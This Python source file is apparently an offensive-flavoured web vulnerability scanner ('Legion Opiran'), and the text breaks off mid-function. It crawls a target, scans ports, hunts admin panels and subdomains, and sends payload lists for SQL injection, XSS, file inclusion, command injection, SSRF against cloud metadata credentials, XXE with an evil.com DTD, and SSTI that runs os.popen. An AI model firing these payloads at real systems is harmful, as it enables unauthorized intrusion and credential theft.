#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║   ██╗     ███████╗ ██████╗ ██╗ █████╗ ███╗   ██╗                ║
║   ██║     ██╔════╝██╔════╝ ██║██╔══██╗████╗  ██║                ║
║   ██║     █████╗  ██║  ███╗██║███████║██╔██╗ ██║                ║
║   ██║     ██╔══╝  ██║   ██║██║██╔══██║██║╚██╗██║                ║
║   ███████╗███████╗╚██████╔╝██║██║  ██║██║ ╚████║                ║
║   ╚══════╝╚══════╝ ╚═════╝ ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝                ║
║                                                                   ║
║        ULTIMATE WEB VULNERABILITY SCANNER v6.0                  ║
║              POWERED BY LEGION OPIRAN                          ║
║          200+ VULNERABILITY CHECKS + ADMIN FINDER              ║
╚═══════════════════════════════════════════════════════════════════╝
"""

import requests
import socket
import json
import time
import os
import random
import ssl
import concurrent.futures
import threading
import re
import hashlib
import base64
import urllib3
import sys
import queue
from urllib.parse import urljoin, urlparse, quote, parse_qs
from datetime import datetime
from colorama import init, Fore, Back, Style
import warnings
from collections import defaultdict
import dns.resolver

warnings.filterwarnings('ignore')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

# ============================== CONSTANTS ==============================
DEFAULT_TIMEOUT = 5
MAX_WORKERS = 50
MAX_CRAWL_PAGES = 40
PORTS_TO_SCAN = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080, 8443, 8888, 9000, 9443, 3000, 5000, 7001, 8000, 8008, 8009, 8081, 8088, 9090, 9200]

# ============================== COLORS ==============================
class Colors:
    CRITICAL = Fore.RED + Style.BRIGHT
    HIGH = Fore.LIGHTRED_EX + Style.BRIGHT
    MEDIUM = Fore.YELLOW + Style.BRIGHT
    LOW = Fore.LIGHTCYAN_EX + Style.BRIGHT
    INFO = Fore.WHITE + Style.BRIGHT
    SUCCESS = Fore.GREEN + Style.BRIGHT
    WARNING = Fore.MAGENTA + Style.BRIGHT
    BANNER = Fore.LIGHTBLUE_EX + Style.BRIGHT
    RESET = Fore.RESET + Style.RESET_ALL
    DIM = Fore.LIGHTBLACK_EX + Style.DIM

# ============================== WORDLIST LOADER ==============================
class WordlistLoader:
    @staticmethod
    def load_from_url(url):
        try:
            r = requests.get(url, timeout=10)
            if r.status_code == 200:
                return [line.strip() for line in r.text.splitlines() if line.strip() and not line.startswith('#')]
        except:
            pass
        return []

    @staticmethod
    def load_admin_paths():
        paths = []
        # AdminHack wordlist2
        paths.extend(WordlistLoader.load_from_url(
            "https://raw.githubusercontent.com/mishakorzik/AdminHack/main/wordlist2.txt"
        ))
        # AdminHack wordlist
        paths.extend(WordlistLoader.load_from_url(
            "https://raw.githubusercontent.com/mishakorzik/AdminHack/main/wordlist.txt"
        ))
        # Omnisci3nt paths
        paths.extend(WordlistLoader.load_from_url(
            "https://raw.githubusercontent.com/spyboy-productions/omnisci3nt/main/omnisci3nt/wordlists/paths.txt"
        ))
        return list(dict.fromkeys([p for p in paths if p]))

    @staticmethod
    def load_subdomains():
        subs = WordlistLoader.load_from_url(
            "https://raw.githubusercontent.com/AsjadOooO/Zero-attacker/Zero-attacker/Zero-Tool/subdomain/basiclist.txt"
        )
        if not subs:
            subs = ['www', 'api', 'dev', 'test', 'staging', 'admin', 'mail', 'ftp', 'cpanel', 'webmail']
        return subs

    @staticmethod
    def load_user_agents():
        try:
            url = "https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt"
            r = requests.get(url, timeout=3)
            if r.status_code == 200:
                return [line.strip() for line in r.text.splitlines() if line.strip()]
        except:
            pass
        return [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15"
        ]

    @staticmethod
    def load_injection_payloads():
        payloads = []
        try:
            url = "https://gist.githubusercontent.com/pathetiq/067e1c20102ada4262779d2817675bb9/raw/40ee61ce5a1416698ae3b552867b99119e82c683/Compiled-Injections-List.txt"
            r = requests.get(url, timeout=3)
            if r.status_code == 200:
                payloads.extend([line.strip() for line in r.text.splitlines() if line.strip()])
        except:
            pass
        extra = [
            "' OR '1'='1", "' UNION SELECT NULL--", "' AND SLEEP(5)--",
            "1' AND 1=1--", "admin'--", "' OR 1=1#",
            "' OR 'x'='x", "' OR 'a'='a' AND 'b'='b",
            "' UNION SELECT 1,2,3--", "' AND 1=2--",
            "1' OR '1'='1'--", "1' OR '1'='2'--",
            "' AND 1=1 AND '1'='1", "' AND 1=2 AND '1'='1",
            "' OR 'x'='y'--", "' OR 'a'='a' AND 'b'='b'--",
            "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--",
            "' AND SLEEP(10)--", "' AND BENCHMARK(1000000,MD5(1))--",
            "' OR (SELECT SLEEP(5))--", "' OR (SELECT BENCHMARK(1000000,MD5(1)))--",
            "1' OR 1=1--", "1' OR 1=2--", "1' AND 1=1--", "1' AND 1=2--"
        ]
        payloads.extend(extra)
        return list(set(payloads))

    @staticmethod
    def load_xss_payloads():
        payloads = []
        try:
            url = "https://raw.githubusercontent.com/pgaijin66/XSS-Payloads/master/payload/payload.txt"
            r = requests.get(url, timeout=3)
            if r.status_code == 200:
                payloads.extend([line.strip() for line in r.text.splitlines() if line.strip()])
        except:
            pass
        extra = [
            "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
            "javascript:alert(1)", "\"><script>alert(1)</script>",
            "<svg/onload=alert(1)>", "onerror=alert(1)",
            "alert(document.cookie)", "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>", "<details open ontoggle=alert(1)>",
            "<video><source onerror=alert(1)>", "<audio src=x onerror=alert(1)>",
            "<marquee onstart=alert(1)>", "<object data=javascript:alert(1)>",
            "<embed src=javascript:alert(1)>", "<link rel=stylesheet href=javascript:alert(1)>",
            "<style>@import url(javascript:alert(1));</style>",
            "<meta http-equiv=refresh content='0;url=javascript:alert(1)'>",
            "<div onmouseover=alert(1)>hover</div>", "<div onclick=alert(1)>click</div>",
            "<a href=javascript:alert(1)>click</a>", "<form action=javascript:alert(1)><input type=submit>",
            "<button onclick=alert(1)>click</button>", "<iframe src=javascript:alert(1)>",
            "<script>alert('XSS')</script>", "<script>alert(document.domain)</script>",
            "<script>alert(window.location)</script>", "<script>alert(navigator.userAgent)</script>",
            "<script>fetch('/')</script>", "<script>eval('alert(1)')</script>",
            "<script>setTimeout('alert(1)',1000)</script>", "<script>setInterval('alert(1)',1000)</script>",
            "<script>window.onload=alert(1)</script>", "<script>document.write('XSS')</script>",
            "<script>document.location='https://evil.com'</script>", "'';!--\"<XSS>=&{()}",
            "<XSS style='behavior: url(#default#time2);' onbegin='alert(1)'>"
        ]
        payloads.extend(extra)
        return list(set(payloads))

# ============================== ADVANCED VULNERABILITY TESTS ==============================
class AdvancedVulnerabilityTests:
    def __init__(self, target, session, cookies=None):
        self.target = target
        self.session = session
        self.cookies = cookies or {}
        self.results = {}
        self.parsed = urlparse(target)
        self.host = self.parsed.netloc
        self.base_url = f"{self.parsed.scheme}://{self.parsed.netloc}"
        self.all_forms = []
        self.all_params = []
        self.crawled_urls = []
        self.vulnerabilities = []
        self.port_lock = threading.Lock()
        self.port_status = {}
        self.severity_map = {
            "SQL Injection": "CRITICAL",
            "Command Injection": "CRITICAL",
            "SSRF": "CRITICAL",
            "XXE": "CRITICAL",
            "SSTI": "CRITICAL",
            "Host Header Injection": "CRITICAL",
            "JWT Exposure": "HIGH",
            "XSS": "HIGH",
            "LFI": "HIGH",
            "Path Traversal": "HIGH",
            "CORS Misconfiguration": "HIGH",
            "Git Exposure": "HIGH",
            "Env Exposure": "HIGH",
            "Open Redirect": "MEDIUM",
            "CRLF Injection": "MEDIUM",
            "Clickjacking": "MEDIUM",
            "CSRF Protection": "MEDIUM",
            "NoSQL Injection": "MEDIUM",
            "API Authentication": "MEDIUM",
            "DOM-based XSS": "MEDIUM",
            "Backup Exposure": "MEDIUM",
            "HSTS Preload": "MEDIUM",
            "Directory Listing": "LOW",
            "Content Spoofing": "LOW",
            "Error Handling": "LOW",
            "Information Disclosure": "LOW",
            "Cookie Security": "LOW",
            "Rate Limiting": "LOW",
            "HTTP Methods": "LOW",
            "HTTPS Redirect": "LOW",
            "HTTP Security Headers": "LOW",
            "SSL/TLS Issues": "LOW",
            "Mixed Content": "LOW",
            "XSS Protection": "LOW",
            "CSP Policy": "LOW",
            "HTTP to HTTPS": "LOW",
            "Header Injection": "HIGH",
            "Subdomain Takeover": "HIGH",
            "Admin Panel": "MEDIUM"
        }
        # Admin paths
        self.admin_paths = WordlistLoader.load_admin_paths()
        self.subdomains = WordlistLoader.load_subdomains()
        self.header_injection_tests = {
            'X-Forwarded-For': '127.0.0.1',
            'X-Real-IP': '127.0.0.1',
            'X-Originating-IP': '127.0.0.1',
            'X-Remote-IP': '127.0.0.1',
            'X-Client-IP': '127.0.0.1',
            'X-Forwarded-Host': 'evil.com',
            'X-Forwarded-Server': 'evil.com',
            'X-Forwarded-Proto': 'http'
        }

    def crawl(self, max_pages=MAX_CRAWL_PAGES):
        urls_to_visit = [self.target]
        visited = set()
        forms = []
        params = set()
        q = queue.Queue()
        q.put((self.target, 0))
        
        while not q.empty() and len(visited) < max_pages:
            url, depth = q.get()
            if url in visited:
                continue
            visited.add(url)
            self.crawled_urls.append(url)
            try:
                resp = self.session.get(url, timeout=DEFAULT_TIMEOUT, verify=False)
                # Extract forms
                form_pattern = r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>(.*?)</form>'
                for action, form_html in re.findall(form_pattern, resp.text, re.DOTALL | re.IGNORECASE):
                    action_url = urljoin(url, action)
                    fields = re.findall(r'<input[^>]*name=["\']([^"\']*)["\'][^>]*>', form_html, re.IGNORECASE)
                    if fields:
                        forms.append({"action": action_url, "fields": fields})
                        params.update(fields)
                # Extract links
                link_pattern = r'<a[^>]*href=["\']([^"\']*)["\'][^>]*>'
                for link in re.findall(link_pattern, resp.text, re.IGNORECASE):
                    if link.startswith('http') and self.host in link and len(visited) < max_pages:
                        q.put((link, depth + 1))
                    elif link.startswith('/') and len(visited) < max_pages:
                        q.put((self.base_url + link, depth + 1))
                # Extract parameters from URL
                parsed_url = urlparse(url)
                if parsed_url.query:
                    for key in parse_qs(parsed_url.query).keys():
                        params.add(key)
            except:
                pass
        self.all_forms = forms
        self.all_params = list(params)
        return forms, list(params)

    def test_header_injection(self):
        """Test header injection vulnerabilities"""
        results = []
        for header, value in self.header_injection_tests.items():
            try:
                headers = {header: value}
                resp = self.session.get(self.target, headers=headers, timeout=3, verify=False)
                if value in resp.text:
                    results.append({'header': header, 'value': value, 'evidence': 'Header value reflected'})
            except:
                pass
        return results

    def test_subdomain_takeover(self):
        """Test for subdomain takeover vulnerability"""
        results = []
        for sub in self.subdomains:
            try:
                target = f"{sub}.{self.host}"
                try:
                    answers = dns.resolver.resolve(target, 'CNAME')
                    for rdata in answers:
                        cname = str(rdata.target).lower()
                        if any(x in cname for x in ['heroku', 'github', 'aws', 'cloudfront', 'azure', 'digitalocean']):
                            results.append({'subdomain': sub, 'cname': cname, 'vulnerable': True})
                except:
                    pass
                try:
                    resp = self.session.get(f"http://{target}", timeout=3, verify=False)
                    if resp.status_code in [404, 400, 500]:
                        results.append({'subdomain': sub, 'status': resp.status_code, 'vulnerable': True})
                except:
                    pass
            except:
                pass
        return results

    def test_admin_panels(self):
        """Find admin panels"""
        results = []
        for path in self.admin_paths[:500]:
            try:
                url = f"{self.base_url}/{path.lstrip('/')}"
                resp = self.session.get(url, timeout=2, verify=False, allow_redirects=True)
                if resp.status_code in [200, 301, 302, 303, 307, 308]:
                    title = ''
                    try:
                        title_match = re.search(r'<title>(.*?)</title>', resp.text, re.I)
                        if title_match:
                            title = title_match.group(1).strip()
                    except:
                        pass
                    admin_indicators = ['admin', 'login', 'dashboard', 'panel', 'control', 'manage', 'system']
                    is_admin = False
                    for indicator in admin_indicators:
                        if indicator in url.lower() or indicator in resp.text.lower():
                            is_admin = True
                            break
                    if is_admin:
                        results.append({
                            'url': url,
                            'status': resp.status_code,
                            'title': title[:60],
                            'size': len(resp.content)
                        })
            except:
                pass
        return results

    def test_certificate(self):
        """Check SSL/TLS certificate"""
        try:
            context = ssl.create_default_context()
            with socket.create_connection((self.host, 443), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=self.host) as ssock:
                    cert = ssock.getpeercert()
                    return {
                        'issuer': cert.get('issuer', []),
                        'subject': cert.get('subject', []),
                        'not_after': cert.get('notAfter', ''),
                        'not_before': cert.get('notBefore', ''),
                        'version': ssock.version(),
                        'cipher': ssock.cipher()[0] if ssock.cipher() else ''
                    }
        except:
            return None

    def test_port_connection(self, port):
        """Check if port is open"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1.5)
            result = sock.connect_ex((self.host, port))
            sock.close()
            if result == 0:
                with self.port_lock:
                    self.port_status[port] = 'open'
                return True
            return False
        except:
            return False

    def test_sqli(self):
        results = []
        payloads = WordlistLoader.load_injection_payloads()[:80]
        test_urls = [self.target] + self.crawled_urls[:15]
        params_to_test = self.all_params[:25] + ['id', 'page', 'cat', 'product', 'user', 'q', 'search', 'sort', 'order', 'filter', 'where', 'by']
        for url in test_urls:
            parsed = urlparse(url)
            base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}" if parsed.path else url
            if parsed.query:
                base += "?" + parsed.query
            for param in params_to_test:
                for payload in payloads[:25]:
                    try:
                        test_url = f"{base}&{param}={quote(payload)}" if "?" in base else f"{base}?{param}={quote(payload)}"
                        start = time.time()
                        resp = self.session.get(test_url, timeout=DEFAULT_TIMEOUT, verify=False)
                        elapsed = time.time() - start
                        if "SLEEP" in payload and elapsed > 2.5:
                            results.append({"url": test_url, "param": param, "payload": payload, "type": "Time-based", "evidence": f"Delay: {elapsed:.2f}s"})
                        if any(err in resp.text.lower() for err in ["sql", "mysql", "postgres", "oracle", "odbc", "driver", "error", "warning"]):
                            results.append({"url": test_url, "param": param, "payload": payload, "type": "Error-based", "evidence": "SQL error message found"})
                    except:
                        pass
        return results

    def test_xss(self):
        results = []
        payloads = WordlistLoader.load_xss_payloads()[:80]
        test_urls = [self.target] + self.crawled_urls[:15]
        params_to_test = self.all_params[:25] + ['q', 's', 'search', 'query', 'id', 'page', 'name', 'text', 'comment', 'msg', 'content']
        for url in test_urls:
            parsed = urlparse(url)
            base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}" if parsed.path else url
            if parsed.query:
                base += "?" + parsed.query
            for param in params_to_test:
                for payload in payloads[:25]:
                    try:
                        test_url = f"{base}&{param}={quote(payload)}" if "?" in base else f"{base}?{param}={quote(payload)}"
                        resp = self.session.get(test_url, timeout=DEFAULT_TIMEOUT, verify=False)
                        if payload in resp.text:
                            results.append({"url": test_url, "param": param, "payload": payload[:50], "type": "Reflected XSS", "evidence": "Payload reflected in response"})
                    except:
                        pass
        for form in self.all_forms[:8]:
            action = form.get("action")
            fields = form.get("fields", [])
            for field in fields[:5]:
                for payload in payloads[:10]:
                    try:
                        data = {f: "test" for f in fields}
                        data[field] = payload
                        resp = self.session.post(action, data=data, timeout=DEFAULT_TIMEOUT, verify=False)
                        if payload in resp.text:
                            results.append({"url": action, "param": field, "payload": payload[:50], "type": "Stored XSS", "evidence": "Payload stored in response"})
                    except:
                        pass
        return results

    def test_lfi(self):
        results = []
        payloads = [
            "../../../../etc/passwd", "../../../../etc/hosts", "../../../../etc/hostname",
            "../../../../etc/shadow", "../../../../proc/self/environ", "../../../../var/log/apache2/access.log",
            "../../../../var/log/nginx/access.log", "%2e%2e%2fetc%2fpasswd", "..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%afetc/passwd", "../../../../etc/passwd%00", "../../../../etc/shadow%00",
            "../../../../var/www/html/config.php", "../../../../var/www/html/.env", "../../../../var/www/html/.htaccess",
            "../../../../var/www/html/wp-config.php", "../../../etc/passwd", "....//....//....//....//etc/passwd"
        ]
        params_to_test = self.all_params[:20] + ['file', 'page', 'path', 'doc', 'dir', 'include', 'load', 'view', 'content', 'template']
        for param in params_to_test:
            for payload in payloads:
                try:
                    test_url = f"{self.target}?{param}={quote(payload)}"
                    resp = self.session.get(test_url, timeout=DEFAULT_TIMEOUT, verify=False)
                    if any(f in resp.text for f in ["root:", "bin:", "daemon:", "localhost", "127.0.0.1", "uid=", "gid="]):
                        results.append({"url": test_url, "param": param, "payload": payload, "evidence": "File content detected"})
                except:
                    pass
        return results

    def test_command_injection(self):
        results = []
        payloads = [
            ";id", "|id", "||id", "&id", "&&id", "$(id)", "`id`",
            ";whoami", "|whoami", ";cat /etc/passwd", "|cat /etc/passwd",
            ";ls -la", "|ls -la", ";pwd", "|pwd",
            ";id;", "|id|", "||id||", "&id&",
            "$(whoami)", "`whoami`",
            ";system('id')", "|system('id')",
            ";phpinfo();", "|phpinfo();",
            ";print_r(1);", "|print_r(1);",
            ";echo test;", "|echo test;"
        ]
        params_to_test = self.all_params[:20] + ['cmd', 'exec', 'command', 'run', 'shell', 'system', 'ping', 'traceroute', 'nslookup', 'exec']
        for param in params_to_test:
            for payload in payloads:
                try:
                    test_url = f"{self.target}?{param}={quote(payload)}"
                    resp = self.session.get(test_url, timeout=DEFAULT_TIMEOUT, verify=False)
                    if any(cmd in resp.text for cmd in ["uid=", "gid=", "groups=", "root", "bin", "usr", "var", "tmp", "etc", "www"]):
                        results.append({"url": test_url, "param": param, "payload": payload, "evidence": "Command output detected"})
                except:
                    pass
        return results

    def test_ssrf(self):
        results = []
        payloads = [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/user-data/",
            "http://127.0.0.1:8080/",
            "http://localhost:8080/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/meta-data/public-keys/",
            "http://169.254.169.254/latest/meta-data/instance-id",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "file:///etc/passwd",
            "gopher://127.0.0.1:8080/_GET / HTTP/1.0"
        ]
        params_to_test = self.all_params[:20] + ['url', 'uri', 'path', 'src', 'dest', 'target', 'redirect', 'fetch', 'curl', 'wget']
        for param in params_to_test:
            for payload in payloads:
                try:
                    test_url = f"{self.target}?{param}={quote(payload)}"
                    resp = self.session.get(test_url, timeout=DEFAULT_TIMEOUT, verify=False)
                    if any(meta in resp.text for meta in ["instance-id", "public-keys", "iam", "security-credentials", "role", "hostname", "local-ipv4", "metadata"]):
                        results.append({"url": test_url, "param": param, "payload": payload, "evidence": "Cloud metadata detected"})
                except:
                    pass
        return results

    def test_xxe(self):
        results = []
        payloads = [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://evil.com/xxe.dtd">%remote;]>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><root>&test;</root>'
        ]
        for payload in payloads:
            try:
                resp = self.session.post(self.target, data=payload, headers={"Content-Type": "application/xml"}, timeout=DEFAULT_TIMEOUT, verify=False)
                if any(key in resp.text for key in ["root:", "bin:", "daemon:", "127.0.0.1", "localhost", "instance-id", "windows"]):
                    results.append({"url": self.target, "payload": payload[:50], "evidence": "XXE vulnerability detected"})
            except:
                pass
        return results

    def test_ssti(self):
        results = []
        payloads = [
            "{{7*7}}", "{{7*'7'}}", "{{config}}",
            "{{self.__class__.__mro__[1].__subclasses__()}}",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "{{config['RUNCMD']('id',True)}}",
            "{{self.module.cache.util.execute('id',True)}}",
            "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
            "{{config.items()}}", "{{config.keys()}}", "{{config.values()}}",
            "{{request}}", "{{session}}", "{{g}}", "{{self}}", "{{self.__dict__}}",
            "{{''.__class__.__mro__[1].__subclasses__()[1].__init__.__globals__}}",
            "{{''.__class__.__mro__[1].__subclasses__()[313].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"whoami\").read()')}}",
            "{{''.__class__.__mro__[1].__subclasses__()[313].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"hostname\").read()')}}",
            "{{''.__class__.__mro__[1].__subclasses__()[313].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"uname -a\").read()')}}",
            "{{''.__class__.__mro__[1].__subclasses__()[313].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"cat /etc/passwd\").read()')}}"
        ]
        params_to_test = self.all_params[:20] + ['name', 'q', 'search', 'query', 'id', 'page', 'template', 'theme', 'lang', 'locale']
        for param in params_to_test:
            for payload in payloads:
                try:
                    test_url = f"{self.target}?{param}={quote(payload)}"
                    resp = self.session.get(test_url, timeout=DEFAULT_TIMEOUT, verify=False)
                    if "49" in resp.text or "config" in resp.text or "__class__" in resp.text or "builtins" in resp.text:
                        results.append({"url": test_url, "param": param, "payload": payload, "evidence": "Template evaluation detected"})
                except:
                    pass
        return results

    def test_open_redirect(self):
        results = []
        payloads = ["//evil.com", "https://evil.com", "http://evil.com", "//evil.com/%2f..", "//evil.com%2F%2F", "//evil.com//", "https://evil.com/", "//evil.com..", "//evil.com?redirect="]
        params_to_test = self.all_params[:20] + ['redirect', 'url', 'return', 'next', 'goto', 'dest', 'target', 'redir', 'link', 'to']
        for param in params_to_test:
            for payload in payloads:
                try:
                    test_url = f"{self.target}?{param}={quote(payload)}"
                    resp = self.session.get(test_url, allow_redirects=False, timeout=DEFAULT_TIMEOUT, verify=False)
                    if resp.status_code in [301, 302, 307, 308] and "evil.com" in resp.headers.get("Location", ""):
                        results.append({"url": test_url, "param": param, "payload": payload, "evidence": f"Redirect to {payload}"})
                except:
                    pass
        return results

    def test_path_traversal(self):
        results = []
        payloads = ["../", "../../", "../../../", "../../../../", ".././../", "..%252f", "..%c0%af", "....//", "..%2e%2e%2f", "../etc/passwd", "../../etc/passwd"]
        params_to_test = self.all_params[:20] + ['file', 'path', 'dir', 'folder', 'doc', 'load', 'view', 'include', 'page', 'cat']
        for param in params_to_test:
            for payload in payloads:
                try:
                    test_url = f"{self.target}?{param}={quote(payload)}"
                    resp = self.session.get(test_url, timeout=DEFAULT_TIMEOUT, verify=False)
                    if "root:" in resp.text or "bin:" in resp.text or "etc" in resp.text:
                        results.append({"url": test_url, "param": param, "payload": payload, "evidence": "Path traversal successful"})
                except:
                    pass
        return results

    def test_directory_listing(self):
        results = []
        paths = ["/", "/images/", "/css/", "/js/", "/uploads/", "/files/", "/data/", "/backup/", "/tmp/", "/logs/", "/assets/", "/media/", "/static/", "/admin/", "/panel/", "/dashboard/"]
        for path in paths:
            try:
                test_url = self.base_url + path
                resp = self.session.get(test_url, timeout=DEFAULT_TIMEOUT, verify=False)
                if "Index of" in resp.text and ("Parent Directory" in resp.text or "<title>Index of" in resp.text):
                    results.append({"url": test_url, "path": path, "evidence": "Directory listing enabled"})
            except:
                pass
        return results

    def test_crlf(self):
        results = []
        payloads = ["%0d%0aHeader: Injected", "%0d%0aSet-Cookie: HACKED=true", "%0d%0a%0d%0a", "%%0d%%0a", "%0d%0aContent-Length: 0%0d%0a%0d%0a", "%0d%0aX-Forwarded-For: 127.0.0.1"]
        params_to_test = self.all_params[:20] + ['q', 'url', 'redirect', 'return', 'next', 'goto']
        for param in params_to_test:
            for payload in payloads:
                try:
                    test_url = f"{self.target}?{param}={quote(payload)}"
                    resp = self.session.get(test_url, timeout=DEFAULT_TIMEOUT, verify=False)
                    if "Header:" in resp.text or "HACKED=true" in resp.text or "127.0.0.1" in resp.text:
                        results.append({"url": test_url, "param": param, "payload": payload, "evidence": "CRLF injection detected"})
                except:
                    pass
        return results

    def test_host_header_injection(self):
        results = []
        hosts = ["evil.com", "attacker.com", "localhost", "127.0.0.1", "internal.host", "example.com", "test.com", "0.0.0.0"]
        for host in hosts:
            try:
                headers = {"Host": host}
                resp = self.session.get(self.target, headers=headers, timeout=DEFAULT_TIMEOUT, verify=False)
                if resp.status_code == 200 and host in resp.text:
                    results.append({"host": host, "evidence": "Host header accepted and reflected", "type": "Host Header Injection"})
                headers = {"X-Forwarded-Host": host}
                resp = self.session.get(self.target, headers=headers, timeout=DEFAULT_TIMEOUT, verify=False)
                if host in resp.text:
                    results.append({"host": host, "evidence": "X-Forwarded-Host accepted", "type": "Host Header Injection"})
            except:
                pass
        return results

    def test_cors_misconfiguration(self):
        results = []
        origins = ["*", "https://evil.com", "http://evil.com", "null", "https://attacker.com"]
        for origin in origins:
            try:
                headers = {"Origin": origin}
                resp = self.session.options(self.target, headers=headers, timeout=DEFAULT_TIMEOUT, verify=False)
                if "Access-Control-Allow-Origin" in resp.headers:
                    acao = resp.headers.get("Access-Control-Allow-Origin")
                    if acao == "*" or acao == origin:
                        results.append({"origin": origin, "acao": acao, "evidence": f"ACAO: {acao}", "type": "CORS Misconfiguration"})
            except:
                pass
        return results

    def test_cookie_security(self):
        results = []
        try:
            resp = self.session.get(self.target, timeout=DEFAULT_TIMEOUT, verify=False)
            for cookie in resp.cookies:
                if not cookie.secure:
                    results.append({"cookie": cookie.name, "issue": "Missing Secure flag", "evidence": "Cookie may be sent over HTTP"})
                if not cookie._rest.get('HttpOnly', False):
                    results.append({"cookie": cookie.name, "issue": "Missing HttpOnly flag", "evidence": "Cookie accessible via JavaScript"})
                if not cookie._rest.get('SameSite', False):
                    results.append({"cookie": cookie.name, "issue": "Missing SameSite attribute", "evidence": "No SameSite protection"})
                if ("session" in cookie.name.lower() or "auth" in cookie.name.lower() or "token" in cookie.name.lower()) and not cookie.secure:
                    results.append({"cookie": cookie.name, "issue": "Session cookie without Secure flag", "evidence": "Session cookie may be hijacked"})
        except:
            pass
        return results

    def test_content_spoofing(self):
        results = []
        try:
            resp = self.session.get(self.target, timeout=DEFAULT_TIMEOUT, verify=False)
            ct = resp.headers.get("Content-Type", "")
            if "text/html" in ct.lower():
                if "charset" not in ct.lower():
                    results.append({"issue": "Missing charset in Content-Type", "evidence": "Character set not specified"})
                if "X-Frame-Options" not in resp.headers:
                    results.append({"issue": "Missing X-Frame-Options", "evidence": "Clickjacking protection missing"})
            if "Content-Encoding" not in resp.headers:
                results.append({"issue": "Missing Content-Encoding", "evidence": "Content encoding not specified"})
        except:
            pass
        return results

    def test_clickjacking(self):
        results = []
        try:
            resp = self.session.get(self.target, timeout=DEFAULT_TIMEOUT, verify=False)
            if "X-Frame-Options" not in resp.headers:
                results.append({"issue": "X-Frame-Options missing", "evidence": "Page can be iframed"})
            csp = resp.headers.get("Content-Security-Policy", "").lower()
            if "frame-ancestors" not in csp:
                results.append({"issue": "CSP frame-ancestors missing", "evidence": "No frame protection in CSP"})
            if "<iframe" in resp.text.lower():
                results.append({"issue": "Iframe used in page", "evidence": "Page contains iframe - potential clickjacking vector"})
        except:
            pass
        return results

    def test_error_handling(self):
        results = []
        error_paths = ["/nonexistent", "/404", "/test/404", "/invalid/file.txt", "/api/v1/nonexistent", "/admin/test", "/login/invalid", "/page/999999", "/id/999999"]
        for path in error_paths:
            try:
                test_url = self.base_url + path
                resp = self.session.get(test_url, timeout=DEFAULT_TIMEOUT, verify=False)
                if resp.status_code == 500:
                    results.append({"path": path, "status": 500, "evidence": "500 Internal Server Error"})
                if "exception" in resp.text.lower() or "stack trace" in resp.text.lower():
                    results.append({"path": path, "status": resp.status_code, "evidence": "Stack trace exposed"})
                if "error" in resp.text.lower() and ("mysql" in resp.text.lower() or "sql" in resp.text.lower() or "database" in resp.text.lower()):
                    results.append({"path": path, "status": resp.status_code, "evidence": "Database error exposed"})
            except:
                pass
        return results

    def test_information_disclosure(self):
        results = []
        paths = ["/info", "/phpinfo.php", "/phpinfo", "/server-status", "/.env", "/config.json", "/.git/config", "/backup.sql", "/database.sql", "/wp-config.php", "/configuration.php", "/settings.php", "/.htaccess", "/.htpasswd", "/.gitignore", "/composer.json", "/package.json", "/requirements.txt", "/robots.txt", "/sitemap.xml"]
        for path in paths:
            try:
                test_url = self.base_url + path
                resp = self.session.get(test_url, timeout=DEFAULT_TIMEOUT, verify=False)
                if resp.status_code == 200:
                    if "phpinfo" in resp.text or "SERVER_SOFTWARE" in resp.text:
                        results.append({"path": path, "evidence": "PHP info exposed", "type": "Information Disclosure"})
                    if "DB_" in resp.text or "PASSWORD" in resp.text or "SECRET" in resp.text:
                        results.append({"path": path, "evidence": "Sensitive configuration exposed", "type": "Information Disclosure"})
                    if ".git/config" in path and "repository" in resp.text:
                        results.append({"path": path, "evidence": "Git config exposed", "type": "Information Disclosure"})
            except:
                pass
        return results

    def test_rate_limiting(self):
        results = []
        try:
            start = time.time()
            for i in range(15):
                self.session.get(self.target, timeout=1, verify=False)
            elapsed = time.time() - start
            if elapsed < 3:
